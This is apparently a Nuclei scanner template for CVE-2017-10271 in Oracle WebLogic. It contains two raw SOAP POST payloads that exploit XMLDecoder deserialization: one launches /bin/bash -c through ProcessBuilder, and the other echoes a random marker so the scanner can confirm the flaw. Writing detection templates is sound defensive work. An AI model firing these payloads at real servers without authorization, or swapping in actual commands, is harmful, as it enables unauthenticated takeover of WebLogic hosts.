id: CVE-2017-10271
info:
  author: dr_set,ImNightmaree
  classification:
    cve-id: CVE-2017-10271
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
  description: 'Vulnerability in the Oracle WebLogic Server component of Oracle Fusion
    Middleware (subcomponent - WLS Security). Supported versions that are affected
    are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability
    allows unauthenticated attacker with network access via T3 to compromise Oracle
    WebLogic Server. Successful attacks of this vulnerability can result in takeover
    of Oracle WebLogic Server.

    '
  name: Oracle WebLogic Server - Remote Command Execution
  reference:
  - https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/CVE-2017-10271
  - https://github.com/SuperHacker-liuan/cve-2017-10271-poc
  - http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
  - http://www.securitytracker.com/id/1039608
  severity: high
  tags: cve,cve2017,rce,oracle,weblogic,oast
requests:
- matchers:
  - condition: or
    regex:
    - <faultstring>.*</faultstring>
    - '{{randstr}}'
    type: regex
  - condition: or
    status:
    - 500
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\
    Accept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"\
    utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"\
    http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\"\
    \ class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\"\
    >\n                    <array class=\"java.lang.String\" length=\"3\">\n     \
    \                   <void index=\"0\">\n                            <string>/bin/bash</string>\n\
    \                        </void>\n                        <void index=\"1\">\n\
    \                            <string>-c</string>\n                        </void>\n\
    \                        <void index=\"2\">\n                            <string>example.com</string>\n\
    \                        </void>\n                    </array>\n             \
    \       <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n\
    \    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n"
  - "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\
    Accept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"\
    utf-8\"?>\n  <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n      <soapenv:Header>\n          <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\
    >\n              <java>\n                  <void class=\"java.lang.Thread\" method=\"\
    currentThread\">\n                      <void method=\"getCurrentWork\">\n   \
    \                       <void method=\"getResponse\">\n                      \
    \        <void method=\"getServletOutputStream\">\n                          \
    \        <void method=\"flush\"/>\n                              </void>\n   \
    \                           <void method=\"getWriter\"><void method=\"write\"\
    ><string>{{randstr}}</string></void></void>\n                          </void>\n\
    \                      </void>\n                  </void>\n              </java>\n\
    \          </work:WorkContext>\n      </soapenv:Header>\n      <soapenv:Body/>\n\
    </soapenv:Envelope>\n"
  stop-at-first-match: true
